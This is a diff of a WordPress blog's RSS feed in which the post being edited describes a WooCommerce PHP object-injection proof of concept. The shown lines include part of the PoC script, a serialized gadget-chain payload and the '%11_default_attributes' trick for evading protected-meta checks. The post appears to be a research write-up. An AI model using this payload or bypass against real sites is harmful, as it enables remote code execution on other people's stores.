@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Sat, 18 Jul 2020 23:05:53 +0000</lastBuildDate>
+	<lastBuildDate>Sat, 18 Jul 2020 23:22:49 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -54,9 +54,7 @@
 
 
 
-<pre class="wp-block-code"><code lang="php" class="language-php">&lt;?php
-//MIT license
-define("WOO_POC_WIZZARD", TRUE);
+<pre class="wp-block-code"><code lang="php" class="language-php">define("WOO_POC_WIZZARD", TRUE);
 if (WOO_POC_WIZZARD){
     if ( isset($argv) &amp;&amp; is_array($argv) ){
         if ( sizeof($argv) >= 2 ){
@@ -133,9 +131,7 @@ exit();
 
 
 
-<pre class="wp-block-code"><code lang="php" class="language-php">&lt;?php 
-
-//grab it from some payload generator Woo/WP or PHP related 
+<pre class="wp-block-code"><code lang="php" class="language-php">//grab it from some payload generator Woo/WP or PHP related 
 //https://gist.github.com/Slavco/946905eef6f9cb0f03a2ed2bdee83d9c
 $payload_real = 'O:19:"WC_Log_Handler_File":1:{S:10:"\00\2A\00\68\61\6E\64\6C\65\73";C:33:"Requests_Utility_FilteredIterator":101:{x:i:0;a:1:{i:0;s:11:"ScotchDolly";};m:a:1:{S:11:"\00\2A\00\63\61\6C\6C\62\61\63\6B";s:9:"error_log";}}}';
 
@@ -169,7 +165,7 @@ exit();
 
 
 
-<p>Now everything left is to add this payload as item of meta value array and to name it <code>%11_default_attributes</code> (url encoded) in order to prevent protected meta check and MySQL query to consider it as desired data that need to be changed.</p>
+<p>Now everything left is to add this payload as item of meta value array and to name it&nbsp;<code>%11_default_attributes</code>&nbsp;(url encoded) in order to prevent protected meta check and MySQL query to consider it as desired data that need to be changed.</p>
 
 
 
@@ -182,7 +178,7 @@ exit();
 
 
 
-<ul><li>Changing a byte from serialized content results with unserialize of user input, because its format</li><li>PHP serialization is faster than json on big data sets</li><li>When someone say do not change serialized string, it means <a href="https://files.ripstech.com/slides/OWASP_AppSec_EU18_WordPress.pdf" target="_blank" rel="noreferrer noopener">do not</a>. &#8211; another core security issue <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" />  </li></ul>
+<ul><li>Changing a byte from serialized content results with unserialize of user input, because its format</li><li>PHP serialization is faster than json on big data sets</li><li>When someone say do not change serialized string, it means <a href="https://files.ripstech.com/slides/OWASP_AppSec_EU18_WordPress.pdf" target="_blank" rel="noreferrer noopener">do not</a>. &#8211; another core security issue <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> &nbsp;</li></ul>
 
 
 
